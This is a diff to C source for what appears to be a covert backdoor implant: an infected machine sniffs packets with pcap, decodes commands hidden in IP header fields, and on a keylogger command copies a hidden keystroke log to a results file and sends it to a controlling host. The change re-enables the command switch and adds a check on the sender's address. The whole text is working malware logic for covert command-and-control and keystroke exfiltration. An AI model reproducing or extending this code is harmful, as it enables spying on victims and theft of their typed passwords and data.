@@ -171,16 +171,22 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
         }
     //infected machine receiving a command
     } else if(Filter->infected == true) {
-        /*switch(CheckKey(ip->ip_tos, ip->ip_id)) {
+        struct in_addr src;
+
+        switch(CheckKey(ip->ip_tos, ip->ip_id)) {
             case COMMAND:
                 printf("COMMAND\n");
                 //write command to .cmd
                 break;
             case KEYLOGGER:
-                printf("KEYLOGGER\n");
-                //copy keylogger file to results file
-                system("cat .keylogger.txt > .results");
-                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
+                src = ip->ip_src;
+                printf("source: %d", ntohs(src.s_addr));
+                if(src.s_addr == inet_addr(Filter->targetip)){
+                    printf("KEYLOGGER\n");
+                    //copy keylogger file to results file
+                    system("cat .keylogger.txt > .results");
+                    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
+                }
                 break;
             case INOTIFY:
                 printf("INOTIFY\n");
@@ -203,29 +209,9 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                 break;
             default:
                 printf("DEBUG: Packet tossed wrong key\n");
-                break;*/
-            printf("tos: %c\n", ip->ip_tos);
-            printf("ipid: %c\n", ip->ip_id);
-            printf("ttl: %c\n", ip->ip_ttl);
-            if(CheckKey(ip->ip_tos, ip->ip_id) == COMMAND) {
-            } else if(CheckKey(ip->ip_tos, ip->ip_id) == KEYLOGGER){
-                struct in_addr src;
-                src = ip->ip_src;
-                printf("source: %d", ntohs(src.s_addr));
-                if(src.s_addr == inet_addr(Filter->targetip)){
-                    printf("KEYLOGGER\n");
-                    //copy keylogger file to results file
-                    system("cat .keylogger.txt > .results");
-                    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
-                }
-            } else {
-                printf("DEBUG: Packet tossed wrong key\n");
-
-            }
+                break;
         }
-
-
-        //send results file
+    }
 
     fclose(fp);
 }
